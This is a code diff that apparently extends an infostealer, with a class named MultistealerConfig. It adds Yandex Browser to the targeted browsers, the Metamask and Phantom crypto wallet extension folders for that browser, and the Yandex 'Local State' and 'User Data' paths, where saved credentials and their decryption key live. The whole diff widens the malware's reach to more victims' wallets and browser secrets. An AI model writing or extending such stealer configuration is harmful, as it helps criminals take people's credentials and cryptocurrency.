@@ -16,6 +16,7 @@ class Browsers(Enum):
     EDGE = "Microsoft Edge"
     BRAVE = "Brave"
     VIVALDI = "Vivaldi"
+    YANDEX = "Yandex"
 
 
 class ChromiumConfig:
@@ -84,6 +85,16 @@ class ChromiumConfig:
                 "name": "Phantom",
                 "folder": "bfnaelmomeimhlpmgjnjophhpkkoljpa"
             }
+        ],
+        Browsers.YANDEX.value: [
+            {
+                "name": "Metamask",
+                "folder": "nkbihfbeogaeaoehlefnkodbefgpgknn"
+            },
+            {
+                "name": "Phantom",
+                "folder": "bfnaelmomeimhlpmgjnjophhpkkoljpa"
+            }
         ]
     }
 
@@ -123,6 +134,11 @@ class MultistealerConfig:
     VivaldiPaths = (
         rf"{user_profile}\AppData\Local\Vivaldi\User Data\Local State",
         rf"{user_profile}\AppData\Local\Vivaldi\User Data",
+    )
+
+    YandexPaths = (
+        rf"{user_profile}\AppData\Local\Yandex\YandexBrowser\User Data\Local State",
+        rf"{user_profile}\AppData\Local\Yandex\YandexBrowser\User Data",
     )
 
 
